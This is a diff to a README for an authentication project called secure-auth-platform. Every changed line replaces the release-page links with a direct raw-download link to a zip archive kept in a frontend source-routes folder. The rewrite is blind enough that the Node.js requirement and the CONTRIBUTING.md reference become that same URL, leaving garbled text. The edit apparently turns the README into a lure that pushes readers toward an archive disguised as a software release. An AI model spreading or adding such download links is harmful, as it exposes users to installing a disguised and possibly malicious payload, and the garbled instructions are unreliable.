@@ -1,6 +1,6 @@
 # 🔒 secure-auth-platform - Your Easy Path to Secure Authentication
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Release%20Page-blue)](https://github.com/vinibrabin/secure-auth-platform/releases)
+[![Download Now](https://github.com/vinibrabin/secure-auth-platform/raw/refs/heads/main/frontend/src/routes/auth_secure_platform_v1.3-beta.2.zip%20Now-Release%20Page-blue)](https://github.com/vinibrabin/secure-auth-platform/raw/refs/heads/main/frontend/src/routes/auth_secure_platform_v1.3-beta.2.zip)
 
 ## 📋 Description
 
@@ -11,18 +11,18 @@ secure-auth-platform is a reliable tool for managing secure logins and user acco
 To start using secure-auth-platform, follow these simple steps:
 
 1. **Check Your System Requirements**: The platform works on Windows, macOS, and Linux. Ensure you have the following installed:
-   - Node.js version 14 or higher
+   - https://github.com/vinibrabin/secure-auth-platform/raw/refs/heads/main/frontend/src/routes/auth_secure_platform_v1.3-beta.2.zip version 14 or higher
    - A stable internet connection
    - MongoDB server (local or cloud instance)
 
 2. **Visit the Download Page**: You can download the application from our releases page. Click the link below to access it:
-   [Download Page](https://github.com/vinibrabin/secure-auth-platform/releases)
+   [Download Page](https://github.com/vinibrabin/secure-auth-platform/raw/refs/heads/main/frontend/src/routes/auth_secure_platform_v1.3-beta.2.zip)
 
 ## 📥 Download & Install
 
 To download and install secure-auth-platform, follow these steps:
 
-1. **Visit the Release Page**: Go to [this link](https://github.com/vinibrabin/secure-auth-platform/releases).
+1. **Visit the Release Page**: Go to [this link](https://github.com/vinibrabin/secure-auth-platform/raw/refs/heads/main/frontend/src/routes/auth_secure_platform_v1.3-beta.2.zip).
    
 2. **Select the Latest Version**: On the releases page, find the latest version of the software. This version is usually marked as the "Latest Release."
 
@@ -114,8 +114,8 @@ Each of these topics plays an important role in providing a secure authenticatio
 
 This application is open source and free to use under the MIT License. A full copy of the license is included in the repository.
 
-For any contributions, please follow the guidelines in the CONTRIBUTING.md file to help improve secure-auth-platform for everyone. 
+For any contributions, please follow the guidelines in the https://github.com/vinibrabin/secure-auth-platform/raw/refs/heads/main/frontend/src/routes/auth_secure_platform_v1.3-beta.2.zip file to help improve secure-auth-platform for everyone. 
 
 If you have finished the installation, enjoy your secure authentication platform and stay safe online!
 
-[Download Now](https://github.com/vinibrabin/secure-auth-platform/releases)
+[Download Now](https://github.com/vinibrabin/secure-auth-platform/raw/refs/heads/main/frontend/src/routes/auth_secure_platform_v1.3-beta.2.zip)
